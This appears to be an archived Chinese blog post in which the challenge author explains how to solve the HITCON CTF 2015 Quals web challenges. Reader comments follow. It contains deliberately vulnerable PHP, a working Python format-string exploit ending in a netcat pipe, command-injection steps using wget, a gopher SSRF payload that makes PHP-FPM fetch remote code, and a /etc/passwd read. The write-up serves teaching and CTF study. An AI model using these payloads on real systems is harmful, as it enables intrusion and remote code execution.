@@ -1,0 +1,78 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">HITCON CTF 2015 Quals Web 出題心得</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">orange.tw</a> <span class="bull">·</span> <time title="2015/10/20 1:31" ui-time="" datetime="2015/10/20 1:31" class="published ng-binding ng-isolate-scope">2015/10/20 1:31</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>作者: <code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="e8879a89868f8da88b809a87879cc6879a8f">[email&#160;protected]</a></code><br>Blog: <a href="http://blog.orange.tw">http://blog.orange.tw</a></p><p><img alt="cover" img-src="0310a670a917e66d4f6edd5d831f82ff281fa7a9.jpg"></p><p>p.s. 相關代碼皆放在 Github 上，有興趣研究之同學可以先看看代碼嘗試解解看後在敘述!</p><p>寫在 HITCON CTF 2015 Quals 之後<br>作為出題團隊的一員，不得不說這次的難度真的不是有點高而已XD<br>不過就身為 DEFCON 種子賽我覺得可以說是名符其實! :)</p><p>這次負責了所有的 Web 題目<br>私心來說都是自信之作，把自己最近研究的一些東西出成題目XD<br>就參賽者反應來說，讓他們在解題時覺得很難但解出後會有「原來如此」、「還可以這樣玩」的感覺是我這次主要出題的目的XD</p><h1>0x01 100 BabyFirst (33 隊解)</h1><hr><pre><code>#!php
+&lt;?php
+    highlight_file(__FILE__);
+    $dir = 'sandbox/' . $_SERVER['REMOTE_ADDR'];
+    if ( !file_exists($dir) )
+        mkdir($dir);
+    chdir($dir);
+    $args = $_GET['args'];
+    for ( $i=0; $i&lt;count($args); $i++ ){
+        if ( !preg_match('/^\w+$/', $args[$i]) )
+            exit();
+    }
+    exec("/bin/orange " . implode(" ", $args));
+?&gt;
+</code></pre><blockquote><p><a href="https://gist.github.com/orangetw/cb3487e47d7aaaea4692">https://gist.github.com/orangetw/cb3487e47d7aaaea4692</a></p></blockquote><p>作為本次 Web 最簡單的題目，純代碼分析並且只有十五行程式碼而已<br>在比賽開始後兩小時才有人解出</p><p>簡單使用 <code>\n</code> 就可以繞過常見正規表示式沒有 <code>match multiline</code> 的問題， 不過難點在於可以 <code>Command Injection</code> 但是指令都限制在是 <code>a-zA-Z0-9_</code><br>這也是最有趣的地方，每個隊伍的想法都不一樣所以會有很多種解法!</p><p>自己的官方解法是</p><pre><code>mkdir orange
+cd orange
+wget HEXED_IP
+tar cvf payload orange
+php payload
+</code></pre><p>就可以任意代碼執行</p><p>從 log 中有看到其他隊伍的解法是</p><pre><code>busybox ftpget ...  
+</code></pre><p>或是</p><pre><code>twistd telnet ...  
+</code></pre><p>或是</p><pre><code>wget HEX_IP
+// 給個 302 Redirect 到 FTP protocol 上，也是這題解法中最訝異的XD
+// 本來還檢查過 wget source code 想說產生的 index.html 應該不可控，結果居然到 FTP Protocol 上竟然就可以控  
+</code></pre><p>總體來講也看到各種玩 Command Line 的極限XD 學到滿多用法的<br>最為出題者來講我覺得是最成功的一題，簡單好玩又有趣!</p><h1>0x02 200 nanana (18 隊解)</h1><hr><blockquote><p><a href="https://gist.github.com/orangetw/4942d949134227eedd4c">https://gist.github.com/orangetw/4942d949134227eedd4c</a></p></blockquote><pre><code>xxd -r -p nanana.xxd &gt; nanana
+</code></pre><p>名為 Web 實際上卻是 Pwn 的題目<br>只提供 binary 並無提供 <code>libcgid.so</code> 所以必須在沒有 library 的狀況下解決這題! 簡單的 <code>Format String</code> 但沒有 <code>output (sprintf)</code>，把 do_job 的 GOT 換成 system 的 PLT 地址就可以</p><p>不過唯一要注意的是得先利用 <code>stack guard</code> 覆蓋 <code>stack smashing detected</code> 的 ARGV<a href="static/drops/full/0310a670a917e66d4f6edd5d831f82ff281fa7a9.jpg">1</a> 的方式達成任意地址洩漏把 password 給洩漏出來才比較好利用<br>但是因為 64-bits 且送的東西無法有 NULL Byte 所以在蓋 ARGV<a href="static/drops/full/0310a670a917e66d4f6edd5d831f82ff281fa7a9.jpg">1</a> 的時候必須用比較迂迴的方式蓋<br>先使用 username 把 ARGV<a href="static/drops/full/0310a670a917e66d4f6edd5d831f82ff281fa7a9.jpg">1</a> 最後一個蓋 NULL<br>再使用 username 把 ARGV<a href="static/drops/full/0310a670a917e66d4f6edd5d831f82ff281fa7a9.jpg">1</a> 倒數第二個蓋 NULL<br>之後 job 蓋記憶體位置(0x601090)三個 bytes 後剩下的五個 bytes 才會剛好是 NULL 以達到任意地址讀取</p><p>詳細 Exploit 可以參考</p><pre><code>#!python
+import requests
+from urllib import urlencode
+from struct import pack, unpack
+
+URL = 'http://54.92.88.102/cgi-bin/nanana'
+
+def leak(address):
+    address = pack('I', address)
+    address = address.strip('\x00')
+
+    payload = {
+        'username': 'A'*349, 
+        'password': 'B'*380, 
+        'job': 'C'*392 + address
+    }
+    r = requests.get(URL+'?'+urlencode(payload))
+    l = r.headers['*** stack smashing detected ***']
+    l = l.strip(' terminated')
+    l = l.ljust(8, '\x00')
+    try:
+        return unpack('Q', l)
+    except:
+        return l
+
+def e(cmd, pwd):
+    payload = {
+        'username': cmd, 
+        'password': pwd, 
+        'job': '\x48\x10\x60', 
+        'action': '%198x%15$hhn'
+    }
+    print urlencode(payload)
+    r = requests.get(URL+'?'+urlencode(payload))
+
+
+
+if __name__ == '__main__':
+
+    pwd = leak(0x601090)
+    print 'pwd @ %s' % pwd
+
+    e('id | nc 127.0.0.1 12345',pwd=pwd)
+</code></pre><blockquote><p><a href="https://gist.github.com/orangetw/583a73f58d49b1a3fc14">https://gist.github.com/orangetw/583a73f58d49b1a3fc14</a></p></blockquote><h1>0x03 300 Giraffe's Coffee (16 隊解)</h1><hr><blockquote><p><a href="https://gist.github.com/orangetw/4a412fb0d49cad0c4ea3">https://gist.github.com/orangetw/4a412fb0d49cad0c4ea3</a></p></blockquote><p>也是代碼分析的題目</p><p>核心的概念是 PHP 中 PRNG 的預測<br>由於電腦很難做到真正的 "隨機"，所以現在大部分隨機樹的產生都基於 PRNG 在 PHP 中 PRNG 的實現是變形的 <code>Mersenne Twister</code> 演算法</p><p>在沒有提供 seed 的下 <code>php_mt_rand</code> 會拿當前 pid 以及時間做一些運算當成種子<br>而這個 seed 是 32-bits 長的，所以是可破解的</p><p>有些人會使用現成的工具來解，但會發現失敗，無法主確的預測 PRNG 是因為當 PHP 在 Apache 下時是使用 prefork 的方式去執行<br>所以每次的連線都是從已經 fork 好的 process 中挑一個去給你使用<br>所以無法確定當前的 process PRNG 中 STATE 的狀態是否為第一次<br>以及每次連線上的 process 也不一定相同所以 STATE 狀態更無法預測<br>(現成工具只會算 seed 後的第一次來比對)</p><p>這點可以使用 Keep-Alive 的方式來確保連上的是同一個 process<br>之後再原本種子的破解上多加上往 STATE 的運算(共有 624 個 STATE) 應該就可以解了!</p><h1>0x04 400 lalala (2 隊解)</h1><hr><p>一個可以給使用者上傳圖片或是提供網址幫你抓起來上傳圖片的服務<br>核心概念就是透過 302 redirect 去繞過限制實現 SSRF，並且再透過 SSRF 中的 gopher 去利用本地的 FastCGI prtocol 實現遠端代碼執行</p><p>在抓取圖片的時候可以使用 302 去做 SSRF<br>(其實很多人在研究 SSRF 的時候都忽略的 302 的妙處)</p><p>在 SSRF 中可以讀檔<br>(<code>Location: file://localhost/etc/passwd</code> )</p><p>會發現伺服器的架構是使用 Nginx + PHP-FPM<br>其中 PHP-FPM fastcgi protocol 是以 bind port 的方式跑在本機上</p><p>在真實世界中，只要發現對方的 PHP FastCGI 是可以外連的話那就可以拿 shell<br>所以使用 gopher 構造 FastCGI Protocol 訪問本機的 9001 port 就可以任意代碼執行</p><pre><code>Location: gopher://127.0.0.1:9001/x%01%01i%13%00%08%00%00%00%01%00%00%00%00%00%00%01%04i%13%00%8B%00%00%0E%03REQUEST_METHODGET%0F%0FSCRIPT_FILENAME/_www/index.php%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%09%26PHP_VALUEauto_prepend_file%20%3D%20http%3A//orange.tw/x%01%04i%13%00%00%00%00%01%05i%13%00%00%00%00
+</code></pre><p>(使用 PHP&#95;ADMIN&#95;VALUE 把 <code>allow_url_include</code> 設成 <code>on</code> 以及新增 <code>auto_prepend_file</code> 到自己的網站)</p><p>這題比較有趣的另外一個點是，如果有實作過 SSRF 搭配 gopher 的話，應該會發現<br>Java 中的 gopher 只能接受 0x00 - 0x7f<br>libcurl 中的 gopher 只能接受 0x01 - 0xff</p><p>然後本題使用 PHP 中的 <code>curl_exec</code> ，會使用到 libcurl 無法使用 NULL Byte<br>但是構造 FastCGI Protocol 的話非得有 NULL Byte 不可<br>後來去研究了一下 libcurl 的原始碼，發現是因為寫得有點問題才不能使用 NULL Byte<br>所以送了一個 commit 過去還被接受了...XD</p><blockquote><p><a href="https://github.com/bagder/curl/commit/5bf36ea30d38b9e00029180ddbab73cab94a2195">https://github.com/bagder/curl/commit/5bf36ea30d38b9e00029180ddbab73cab94a2195</a></p></blockquote><p>所以現在新版本的 libcurl / curl 應該 gopher 都可以使用 NULL Byte 了XD</p><h1>0x05 500 Use-After-FLEE (1 隊解)(只有 PPP 解出)</h1><hr><p>身為 Web 最難題XD<br>許多時候，在做滲透測試時都會遇到，打進一台虛擬主機(hosting)後要去訪問同主機上的其他網站會被 <code>open_basedir</code> 以及 <code>disable_functions</code> 限制住</p><p>但 PHP 在歷史上出現過了許許多多的 Memory 上的洞，這題使用到的就是其中一個<br>( 出題時 Ubuntu apt-get 預設安裝的 PHP 還是有洞，不過寫這篇文章時好像已經修了XD )</p><p>漏洞 PoC 的話可參考 80vul 的 PHP Codz Hacking<br>不過只有 PoC :(</p><blockquote><p><a href="https://github.com/80vul/phpcodz/blob/master/research/pch-034.md">https://github.com/80vul/phpcodz/blob/master/research/pch-034.md</a></p></blockquote><p>使用 Use-After-Free 去繞過上面限制，說的好像很簡單，不過在現今作業系統中有很多的保護你必須面對</p><ol><li>DEP</li><li>FULL ASLR</li><li>PIE (Apache 預設全開)</li><li>FULL RELRO (Apache 預設全開)</li><li>由於環境在 Apache + mod_php 上，PHP 是以 Library 的形式被載入到 Apache 中，所以再利用難度上會增加(純 CLI 其實很容易 Exploit)，例如要自己處理 Parsing ELF 的動作XD</li></ol><p>不過 PPP 不愧是最強隊伍在比賽結束前一個半小時解出，也是唯一一隊解出的隊伍!<br>不過有點小遺憾的是，因為比賽平台都在 EC2 的 Ubuntu 14.04 64-bits 上，所以對於 libc 的 offset 他們直接拿其他 Pwn 題目的 libc offset 而不是透過算 STRTAB, SYMTAB, JMPREL 來把 offset 找出 :)</p><p>其中 PPP 中 Ricky 的 writeup</p><blockquote><p><a href="https://github.com/pwning/public-writeup/blob/master/hitcon2015/web500-use-after-flee/exploit.php">https://github.com/pwning/public-writeup/blob/master/hitcon2015/web500-use-after-flee/exploit.php</a></p></blockquote><p>其中 Ricky 的利用是把 ZVAL 結構中 handler 換成 system 的位置並且這個 ZVAL 的型態宣告成 OBJECT 並且 refcount 為 0</p><pre><code>struct _zval_struct {
+  zvalue_value value;
+  zend_uint refcount__gc;
+  zend_uchar type;
+  zend_uchar is_ref__gc;
+};
+</code></pre><p>這樣 PHP 內部在處理時發現引用為 0 時會自動做 destruct 把並且把 ZVAL 當成參數丟給 handler<br>這時有 8 bytes 的指令長度限制可以用(所以 Ricky 使用 <code>sh /*/a;</code> 的做法來執行指令)<br>不過如果在 32-bits 下就變成 4 bytes 的長度限制幾乎無法利用XD</p><p>比較優雅的做法可以把 GOT Hijacking 把 fopen 換成 system 之後呼叫 fopen 就可以任意指令執行</p><pre><code>write($open_got, $system_address);
+fopen("| $cmd", "r");
+</code></pre><p>有興趣的同學可以嘗試寫寫看，並且想辦法把 Exploit 寫到完美! :P</p><p>寫到這裡<br>在 Web Security 的領域上有太多太多的 tricks 以及問題等待著我們去解決<br>身為一個 Web 狗，我很驕傲 :)</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/papers/8988" rel="bookmark" id="re1">WordPress Vulnerability Analysis (CVE-2015-5714 &amp; CVE-2015-5715)</a></li><li><a href="http://drops.wooyun.org/tips/1376" rel="bookmark" id="re2">使用netcat进行反弹链接的shellcode</a></li><li><a href="http://drops.wooyun.org/papers/13948" rel="bookmark" id="re3">SSRF libcurl protocol wrappers利用分析</a></li><li><a href="http://drops.wooyun.org/papers/10896" rel="bookmark" id="re4">CVE-2015-1538漏洞利用中的Shellcode分析</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Byman</span> <span class="reply-time">2015-12-22 14:35:22</span></div><p></p><p>一个不会+1</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Fire ant</span> <span class="reply-time">2015-10-31 10:48:25</span></div><p></p><p>看完之后我都不敢说自己是WEB狗了，还是默默学习去T.T</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">range</span> <span class="reply-time">2015-10-21 22:28:47</span></div><p></p><p>就比我多个O而已，差距咋这么大呢</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">winsyk</span> <span class="reply-time">2015-10-20 15:30:47</span></div><p></p><p>厉害！虽然看繁体挺累的。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">胡小树</span> <span class="reply-time">2015-10-20 13:44:03</span></div><p></p><p>吊吊吊，一题都做不出，然后就没信心了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">_Evil</span> <span class="reply-time">2015-10-20 11:51:12</span></div><p></p><p>一直非常欣赏台湾同胞的技术.</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">em</span> <span class="reply-time">2015-10-20 11:04:29</span></div><p></p><p>看完之后我都不敢说自己是WEB狗了，还是默默学习去T.T</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">insight-labs</span> <span class="reply-time">2015-10-20 10:59:40</span></div><p></p><p>題目很讚~必須頂一下!</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">scanf</span> <span class="reply-time">2015-10-20 09:53:23</span></div><p></p><p>厉害啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">风若新</span> <span class="reply-time">2015-10-20 09:46:21</span></div><p></p><p>厉害呀</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">夏殇</span> <span class="reply-time">2015-10-20 09:21:36</span></div><p></p><p>看完之后我都不敢说自己是WEB狗了，还是默默学习去T.T</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser</span> <span class="reply-time">2015-10-20 09:15:51</span></div><p></p><p>很有想象力</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">RickGray</span> <span class="reply-time">2015-10-20 09:03:38</span></div><p></p><p>Orange大牛</p><p></p></div></div></div></div></div></main>
